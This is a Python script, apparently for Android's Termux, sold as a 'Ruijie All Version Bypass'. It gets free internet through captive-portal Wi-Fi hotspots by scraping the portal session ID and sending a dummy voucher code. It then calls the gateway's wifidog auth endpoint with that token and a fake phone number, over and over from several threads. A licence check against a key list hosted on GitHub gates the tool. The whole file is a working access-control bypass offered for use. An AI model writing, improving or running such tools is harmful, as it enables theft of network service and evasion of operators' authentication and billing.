import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIG
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False

# ===============================
# GITHUB KEY SYSTEM CONFIG (UPDATED)
# ===============================
# GitHub က 'Raw' ခလုတ်ကို နှိပ်ပြီး ရလာတဲ့ URL ကို ဒီမှာ ထည့်ပါ
GITHUB_RAW_URL = "https://raw.githubusercontent.com/tmmt6132-coder/Bypass/main/keys.txt"

# ===============================
# COLOR SYSTEM
# ===============================
RED = "\033[91m"; GREEN = "\033[92m"; CYAN = "\033[96m"
YELLOW = "\033[93m"; MAGENTA = "\033[95m"; RESET = "\033[0m"
B_GREEN = "\033[1;32m"; B_CYAN = "\033[1;36m"; B_RED = "\033[1;31m"

# ===============================
# LOGGING
# ===============================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    datefmt="%H:%M:%S"
)

stop_event = threading.Event()

# ===============================
# KEY APPROVAL FUNCTIONS (GITHUB VERSION)
# ===============================
def get_system_key():
    """Termux User Key ကို ယူခြင်း (e.g. u0_a321)"""
    try:
        import subprocess
        return subprocess.check_output("whoami", shell=True).decode().strip()
    except:
        return os.environ.get('USER', 'unknown')

def check_approval():
    os.system('clear')
    print(f"{B_CYAN}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    GITHUB KEY APPROVAL SYSTEM                      ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
    
    my_key = get_system_key()
    print(f"\n{CYAN}[!] Syncing with GitHub server...{RESET}")
    print(f"{CYAN}[*] Your Device Key: {RESET}{YELLOW}{my_key}{RESET}")
    
    try:
        response = requests.get(GITHUB_RAW_URL, timeout=10)
        if response.status_code == 200:
            lines = response.text.strip().split('\n')
            
            for line in lines:
                if not line.strip(): continue
                
                # စာကြောင်းထဲမှာ သင့် Key (u0_a321) ပါသလား စစ်မယ်
                if my_key in line:
                    parts = line.split(':')
                    # format: Name:Date:Key ဆိုရင် parts[1] က Date ဖြစ်မယ်
                    expiry_str = parts[1] if len(parts) > 1 else "2030-01-01"

                    try:
                        # ရက်စွဲ သက်တမ်းကုန်/မကုန် စစ်ခြင်း
                        expiry_date = datetime.strptime(expiry_str.strip(), '%Y-%m-%d')
                        if datetime.now() < expiry_date:
                            print(f"\n{B_GREEN}   [✓] KEY APPROVED! ACCESS GRANTED.{RESET}")
                            print(f"   {CYAN}Expiry Date: {RESET}{B_GREEN}{expiry_str}{RESET}")
                            time.sleep(1.5)
                            return True
                        else:
                            print(f"\n{B_RED}   [❌] KEY EXPIRED ON {expiry_str}{RESET}")
                            return False
                    except:
                        # ရက်စွဲ Format မှားနေရင်လည်း Key ပါရင် ပေးသုံးမယ်
                        return True
            
            print(f"\n{B_RED}   [❌] KEY NOT APPROVED{RESET}")
            print(f"   {YELLOW}Contact Admin: {RESET}@mg_ban_official")
            return False
        else:
            print(f"\n{B_RED}[!] GitHub Server Error (Status: {response.status_code}){RESET}")
            return False
    except Exception as e:
        print(f"\n{B_RED}[!] Connection Failed: {e}{RESET}")
        return False

# ===============================
# INTERNET CHECK (ကျန်တာတွေ အရင်အတိုင်း)
# ===============================
def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

def banner():
    print(f"""{MAGENTA}
╔══════════════════════════════════════╗
║        Ruijie All Version Bypass     ║
║        Pro Terminal Edition         ║
╚══════════════════════════════════════╝
{RESET}""")

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=5, verify=False)
            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active     ", end="\r")
        except:
            print(f"{RED}[X]{RESET} Connection Lost...               ", end="\r")
            break
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_process():
    banner()
    logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)

            if r.url == test_url:
                if check_real_internet():
                    print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")

            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]

            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                logging.warning(f"{RED}Session ID Not Found{RESET}")
                time.sleep(5)
                continue

            print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")

            # Optional Voucher Test
            print(f"{CYAN}[*] Checking Voucher Endpoint...{RESET}")
            voucher_api = f"{portal_host}/api/auth/voucher/"

            try:
                v_res = session.post(
                    voucher_api,json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1},
                    timeout=5, verify=False
                )
                print(f"{GREEN}[✓]{RESET} Voucher API Status: {v_res.status_code}")
            except:
                print(f"{YELLOW}[!]{RESET} Voucher Endpoint Skipped")

            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]

            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")

            for _ in range(PING_THREADS):
                threading.Thread(
                    target=high_speed_ping,
                    args=(auth_link, sid),
                    daemon=True
                ).start()

            while check_real_internet():
                time.sleep(5)

        except Exception as e:
            if DEBUG:
                logging.error(f"{RED}Error: {e}{RESET}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        if check_approval():
            start_process()
        else:
            sys.exit(1)
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}Turbo Engine Shutdown...{RESET}")
        
